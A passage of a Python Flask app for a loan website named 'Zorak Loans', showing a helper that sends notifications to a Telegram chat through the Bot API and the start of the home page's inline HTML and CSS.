from flask import Flask, request
import csv, os, requests
from datetime import datetime
app = Flask(__name__)
WHATSAPP_LINK = 'https://wa.me/message/CFCJWLOZ7IWZK1'
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')
def send_to_telegram(text):
    if not BOT_TOKEN or not CHAT_ID:
        print('Telegram not configured')
        return False
    try:
        r = requests.post('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', json={'chat_id': CHAT_ID, 'text': text}, timeout=10)
        print('Telegram status:', r.status_code, r.text)
        return r.status_code == 200
    except Exception as e:
        print('Telegram error:', e)
        return False
HOME_HTML = '''
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Zorak Loans</title>
<style>
* { box-sizing: border-box; font-family: Arial, sans-serif; }
body { margin: 0; background: #eef1f5; padding: 15px; }
.top { text-align: center; color: #0f7a55; font-size: 26px; font-weight: 900; padding: 10px 0 15px; }
.top span { color: #111; }
.card { max-width: 420px; margin: 0 auto; background: white; border-radius: 20px; padding: 22px 18px; box-shadow
